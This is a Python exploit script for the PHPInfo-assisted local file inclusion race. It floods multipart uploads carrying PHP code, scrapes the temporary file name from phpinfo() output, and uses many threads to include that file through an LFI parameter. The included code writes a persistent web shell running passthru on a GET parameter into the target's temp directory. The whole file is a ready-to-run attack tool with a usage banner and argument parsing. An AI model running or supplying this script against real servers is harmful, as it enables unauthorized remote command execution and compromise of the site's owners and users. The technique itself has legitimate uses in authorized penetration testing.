#!/usr/bin/python3
import sys
import threading
import socket
import re
import argparse
import os

counter = 0

def setup(host, phpinfo_path, lfi_path, tmp_dir):
    print("set up...")
    tag = b"Security Test"
    evil_file = os.path.join(tmp_dir, "evil").encode()
    payload = b"""%b\r
<?php $c=fopen('%b','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r""" % (tag, evil_file)
    req1_data = b"""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%b
-----------------------------7dbff1ded0714--\r""" % payload
    padding = b"A" * 5000
    req1_template = b"""POST %b?a=%b HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=%b\r
HTTP_ACCEPT: %b\r
HTTP_USER_AGENT: %b\r
HTTP_ACCEPT_LANGUAGE: %b\r
HTTP_PRAGMA: %b\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %d\r
Host: %s\r
\r
%b"""
    req1 = req1_template % (
        phpinfo_path.encode(), padding, padding, padding, padding, padding, padding,
        len(req1_data), host.encode(), req1_data
    )
    lfi_req = b"GET %b%b HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: %b\r\n\r\n" % (
        lfi_path.encode(), b"%b", host.encode()
    )
    return (req1, tag, lfi_req, evil_file)

def send_request(host, port, request):
    """Send a request and return the response"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(request)
        response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
            if data.endswith(b"0\r\n\r\n"):
                break
        s.close()
        return response
    except socket.error as e:
        print(f"Socket error: {e}")
        return None

class ThreadWorker(threading.Thread):
    def __init__(self, event, lock, max_attempts, evil_file, host, port, php_info_req, offset, lfi_req, tag):
        threading.Thread.__init__(self)
        self.event = event
        self.lock = lock
        self.max_attempts = max_attempts
        self.evil_file = evil_file
        self.host = host
        self.port = port
        self.php_info_req = php_info_req
        self.offset = offset
        self.lfi_req = lfi_req
        self.tag = tag

    def phpinfo_lfi(self):
        """Perform the PHPInfo LFI exploit"""
        phpinfo_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lfi_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        phpinfo_s.connect((self.host, self.port))
        lfi_s.connect((self.host, self.port))
        phpinfo_s.sendall(self.php_info_req)
        data = b""
        while len(data) < self.offset:
            data += phpinfo_s.recv(self.offset)
        try:
            i = data.index(b"[tmp_name] =")
            match = re.search(br'\[tmp_name\] =&gt; (.*)\n', data[i:])
            if not match:
                print("not found tmp_name")
                return None
            filename = match.group(1)
        except ValueError:
            return None
        lfi_s.sendall(self.lfi_req % filename)
        response = lfi_s.recv(4096)
        phpinfo_s.close()
        lfi_s.close()
        if self.tag in response:
            return filename.decode()
        return None

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.max_attempts:
                    return
                counter += 1
            try:
                result = self.phpinfo_lfi()
                if self.event.is_set():
                    break
                if result:
                    print("\nGot it! Shell created in %s" % self.evil_file.decode())
                    self.event.set()
            except socket.error:
                return

def get_offset(host, port, php_info_req):
    """Gets offset of tmp_name in the php output"""
    response = send_request(host, port, php_info_req)
    if response is None:
        raise ValueError("Failed to get response from server")
    i = response.find(b"[tmp_name] =")
    if i == -1:
        print(f"Response received: {response.decode(errors='replace')}")
        raise ValueError("No php tmp_name in phpinfo output")
    print("found %s at %i" % (response[i:i+10].decode(), i))
    return i + 256

def main():
    print('''Example: python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -p "linux" -tmp_dir "/tmp" -phpinfo "/phpinfo.php"''')
    parser = argparse.ArgumentParser(description="LFI With PHPInfo()")
    parser.add_argument("host", help="Target hostname or IP, e.g., 127.0.0.1")
    parser.add_argument("port", type=int, help="Port number, e.g., 80")
    parser.add_argument("-lfi", required=True, help="LFI path (e.g., lfi.php?file=)")
    parser.add_argument("-phpinfo", default="php/phpinfo.php", help="PHPInfo path (default: php/phpinfo.php)")
    parser.add_argument("-p", "--platform", choices=['linux', 'windows'], default="linux", 
                        help="Platform: linux or windows (default: linux)")
    parser.add_argument("-tmp_dir", help="Temporary directory (default: /tmp for linux, /xampp/tmp for windows)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    args = parser.parse_args()

    print("LFI With PHPInfo()")
    print("-=" * 30)

    try:
        host = socket.gethostbyname(args.host)
    except socket.error as e:
        print(f"Error with hostname {args.host}: {e}")
        sys.exit(1)

    port = args.port
    pool_size = args.threads
    php_info_path = args.phpinfo
    lfi_path = args.lfi
    platform = args.platform
    tmp_dir = args.tmp_dir if args.tmp_dir else ("/tmp" if platform == "linux" else "/xampp/tmp")

    print(f"Platform: {platform}")
    print(f"Temporary directory: {tmp_dir}")
    print(f"LFI path: {lfi_path}")
    print(f"PHPInfo path: {php_info_path}")

    print("Getting initial offset...")
    req_php, tag, lfi_req, evil_file = setup(host, php_info_path, lfi_path, tmp_dir)
    offset = get_offset(host, port, req_php)
    sys.stdout.flush()
    max_attempts = 10000
    event = threading.Event()
    lock = threading.Lock()
    print("Spawning worker pool (%d)..." % pool_size)
    sys.stdout.flush()
    thread_pool = [ThreadWorker(event, lock, max_attempts, evil_file, host, port, req_php, offset, lfi_req, tag) 
                   for _ in range(pool_size)]
    for thread in thread_pool:
        thread.start()
    try:
        while not event.wait(1):
            if event.is_set():
                break
            with lock:
                sys.stdout.write("\r% 4d / % 4d" % (counter, max_attempts))
                sys.stdout.flush()
            if counter >= max_attempts:
                break
        print()
        if event.is_set():
            print("Woot! \m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        event.set()
    print("Shutting down...")
    for thread in thread_pool:
        thread.join()

if __name__ == "__main__":
    main()